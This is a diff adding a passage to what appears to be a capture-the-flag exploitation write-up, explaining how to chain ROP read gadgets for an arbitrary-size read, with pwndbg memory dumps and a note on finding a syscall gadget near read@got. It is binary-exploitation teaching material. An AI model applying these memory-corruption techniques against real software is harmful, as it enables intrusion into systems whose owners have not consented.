@@ -44,6 +44,52 @@ The memory layout should be looks like:
 # sigreturn frame
 ```
 
+Now, let's think about how to achieve an arbitrary size read. Assume following memory dump is the stats of the first time read, because we want get an arbitrary size consistent read, so we cannot chain the next `read` gadget write to `0x404038` directly.
+
+```plaintext showLineNumbers=false
+pwndbg> x/10gx 0x404028
+0x404028: 0x4141414141414141 0x4141414141414141
+0x404038: 0x0000000000404048 0x0000000000401133
+0x404048: 0x0000000000000000 0x0000000000000000
+0x404058: 0x0000000000000000 0x0000000000000000
+0x404068: 0x0000000000000000 0x0000000000000000
+```
+
+If we directly write to the next consistent address, it'll cause `read` return to `0x4242424242424242` and crash the program.
+
+```plaintext showLineNumbers=false
+pwndbg> x/10gx 0x404028
+0x404028: 0x4141414141414141 0x4141414141414141
+0x404038: 0x4242424242424242 0x4242424242424242
+0x404048: 0x0000000000404058 0x0000000000401133
+0x404058: 0x0000000000000000 0x0000000000000000
+0x404068: 0x0000000000000000 0x0000000000000000
+```
+
+The way to bypass is fairly simple, just avoid corrupt the return address later used by `read`. First, we read some junk bytes to `0x404048` to keeping the rop chain alive so we can read more data.
+
+```plaintext showLineNumbers=false
+pwndbg> x/10gx 0x404028
+0x404028: 0x4141414141414141 0x4141414141414141
+0x404038: 0x0000000000404058 0x0000000000401149
+0x404048: 0x5858585858585858 0x5858585858585858
+0x404058: 0x0000000000404048 0x0000000000401133
+0x404068: 0x0000000000000000 0x0000000000000000
+```
+
+Then write the actual data which we needed to `0x404038`.
+
+```plaintext showLineNumbers=false
+pwndbg> x/10gx 0x404028
+0x404028: 0x4141414141414141 0x4141414141414141
+0x404038: 0x4242424242424242 0x4242424242424242
+0x404048: 0x0000000000404048 0x0000000000401133
+0x404058: 0x0000000000404048 0x0000000000401149
+0x404068: 0x0000000000000000 0x0000000000000000
+```
+
+Finally, repeat the same way to achieve arbitrary size read.
+
 As for how to get the `syscall; ret` gadget, we can utilize `read@got`, checking instructions nearby `read`, you can found some of them.
 
 So the final memory layout should be:
